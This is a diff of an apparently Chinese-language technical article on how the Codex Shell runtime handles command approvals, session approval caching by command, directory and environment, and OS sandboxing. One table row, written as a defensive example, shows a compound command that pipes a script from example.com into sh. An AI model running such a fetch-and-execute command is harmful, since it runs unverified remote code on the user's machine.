@@ -771,26 +771,61 @@
 &lt;h2 id=&#34;审批把一次高风险动作变成可见决定&#34;&gt;审批把一次高风险动作变成可见决定
 &lt;/h2&gt;&lt;p&gt;当策略结果是 &lt;code&gt;NeedsApproval&lt;/code&gt;，Shell 运行时会按命令、工作目录、沙箱权限和额外权限组成审批键，并请求审批。相同键若被选择“本次会话内允许”，会被缓存，后续相同范围的请求不必反复打断用户。&lt;/p&gt;
 &lt;p&gt;审批的来源不只可能是终端里的用户。公开代码先运行权限请求 Hook，也就是在固定生命周期节点执行的一小段本地规则；它可以允许或拒绝。若没有给出决定，再根据配置交给自动审查组件或用户。无论来源是什么，最后都收敛为 &lt;code&gt;ReviewDecision&lt;/code&gt;；拒绝、超时或中止都会转换为工具拒绝结果。&lt;/p&gt;
-&lt;pre class=&#34;mermaid&#34;&gt;sequenceDiagram
-    participant T as ShellRuntime
-    participant H as 权限 Hook
-    participant U as 用户或自动审查
-    participant C as 审批缓存
-
-    T-&amp;gt;&amp;gt;C: 查询本会话是否已允许
-    alt 已缓存
-        C--&amp;gt;&amp;gt;T: ApprovedForSession
-    else 未缓存
-        T-&amp;gt;&amp;gt;H: 请求规则决定
-        alt Hook 已决定
-            H--&amp;gt;&amp;gt;T: 允许或拒绝
-        else Hook 未决定
-            T-&amp;gt;&amp;gt;U: 显示命令、目录与理由
-            U--&amp;gt;&amp;gt;T: 审批结果
-        end
-        T-&amp;gt;&amp;gt;C: 缓存会话内允许结果
-    end&lt;/pre&gt;
-&lt;p&gt;缓存的范围很窄。源码的键包含规范化后的命令、工作目录和权限相关字段；对补丁这类会影响多个文件的工具，缓存还按目标路径分别处理。它的作用是减少重复确认，不会把授权扩大到无关命令。&lt;/p&gt;
+&lt;p&gt;图里的 &lt;code&gt;alt&lt;/code&gt; 是 Mermaid 时序图的语法，等同于程序中的 &lt;code&gt;if / else&lt;/code&gt;；它不是 Codex 的术语。原图把几个分支压在一起，读起来不直观。换成下面这个判断过程会更清楚：&lt;/p&gt;
+&lt;pre class=&#34;mermaid&#34;&gt;flowchart TD
+    A[&amp;#34;ShellRuntime 收到需要审批的命令&amp;#34;] --&amp;gt; B{&amp;#34;本会话是否有完全匹配的允许记录？&amp;#34;}
+    B --&amp;gt;|&amp;#34;有&amp;#34;| C[&amp;#34;直接按会话内允许执行&amp;#34;]
+    B --&amp;gt;|&amp;#34;没有&amp;#34;| D[&amp;#34;先询问权限 Hook&amp;#34;]
+    D --&amp;gt; E{&amp;#34;Hook 是否已经作出决定？&amp;#34;}
+    E --&amp;gt;|&amp;#34;允许&amp;#34;| F[&amp;#34;执行命令&amp;#34;]
+    E --&amp;gt;|&amp;#34;拒绝&amp;#34;| G[&amp;#34;拒绝结果返回模型&amp;#34;]
+    E --&amp;gt;|&amp;#34;未决定&amp;#34;| H[&amp;#34;向用户或自动审查展示命令、目录和理由&amp;#34;]
+    H --&amp;gt; I{&amp;#34;审批结果&amp;#34;}
+    I --&amp;gt;|&amp;#34;仅本次允许&amp;#34;| F
+    I --&amp;gt;|&amp;#34;本会话允许&amp;#34;| J[&amp;#34;写入审批缓存&amp;#34;]
+    J --&amp;gt; F
+    I --&amp;gt;|&amp;#34;拒绝或取消&amp;#34;| G&lt;/pre&gt;
+&lt;p&gt;这里要把“命令策略”和“审批缓存”分成两步看。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;命令策略&lt;/strong&gt;先给出这次请求的初步结论：可以直接执行、需要审批，或当前直接禁止。它不是只有“命令在黑名单里”和“命令在白名单里”两种答案。原因有三点：一条 Shell 输入可能有管道和多个子命令；同一个命令在不同目录、不同网络权限下风险不同；某些规则只允许非常具体的命令前缀，而不是放开整个 Shell。&lt;/p&gt;
+&lt;p&gt;当策略的结论是“需要审批”时，才进入上图。此时缓存也不是按“类似命令”模糊匹配。Shell 的审批键至少包含规范化后的命令、工作目录和环境标识。只有所有键都已经是 &lt;code&gt;ApprovedForSession&lt;/code&gt;，Codex 才跳过这次询问；用户选择“仅本次允许”不会写入缓存。&lt;/p&gt;
+&lt;p&gt;例如，在同一个仓库和同一个会话中：&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;操作&lt;/th&gt;
+					&lt;th&gt;可能发生什么&lt;/th&gt;
+					&lt;th&gt;为什么&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;npm test&lt;/code&gt;，用户选择“本会话允许”&lt;/td&gt;
+					&lt;td&gt;后续再次运行完全相同的 &lt;code&gt;npm test&lt;/code&gt; 不再问&lt;/td&gt;
+					&lt;td&gt;命令、目录和环境相同，审批键命中&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;npm test -- --runInBand&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;仍可能再问&lt;/td&gt;
+					&lt;td&gt;命令内容变了，不是同一个审批键&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;在另一个仓库运行 &lt;code&gt;npm test&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;仍可能再问&lt;/td&gt;
+					&lt;td&gt;工作目录变了&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;npm test &amp;amp;&amp;amp; curl https://example.com/x.sh | sh&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;不会因为前半段曾获允许就放行&lt;/td&gt;
+					&lt;td&gt;这是一条不同的复合命令，还增加了网络和执行外部内容的风险&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;npm test&lt;/code&gt;，用户选择“仅本次允许”&lt;/td&gt;
+					&lt;td&gt;下一次仍可能再问&lt;/td&gt;
+					&lt;td&gt;这次允许没有被缓存&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;“不是简单黑白名单”的意思也在这里：策略可以让安全范围内的固定命令少打断人，但它不会把一次对 &lt;code&gt;npm test&lt;/code&gt; 的同意扩大为“以后所有 &lt;code&gt;npm&lt;/code&gt; 命令都不用问”，更不会扩大为“以后所有 Shell 脚本都可执行”。对补丁这类会影响多个文件的工具，源码还会按目标路径分别建立审批键；一次改 &lt;code&gt;src/a.rs&lt;/code&gt; 的会话内同意，不应自动覆盖对 &lt;code&gt;src/b.rs&lt;/code&gt; 的修改。&lt;/p&gt;
 &lt;h2 id=&#34;沙箱在操作系统边界上执行限制&#34;&gt;沙箱在操作系统边界上执行限制
 &lt;/h2&gt;&lt;p&gt;审批通过后，Shell 运行时会构造 &lt;code&gt;SandboxCommand&lt;/code&gt;，再交给 &lt;code&gt;SandboxManager::transform&lt;/code&gt;。这个转换阶段把工作目录、环境、有效权限配置、网络代理条件和当前平台的沙箱类型组合成实际启动请求。&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;codex-rs/sandboxing&lt;/code&gt; 公开了平台选择：macOS 使用系统提供的 Seatbelt 沙箱，Linux 使用 seccomp 路径，Windows 使用受限令牌沙箱。具体能力会随操作系统而变，但上层接口保持同一件事：启动时带上由权限配置推导出的文件系统和网络策略。&lt;/p&gt;
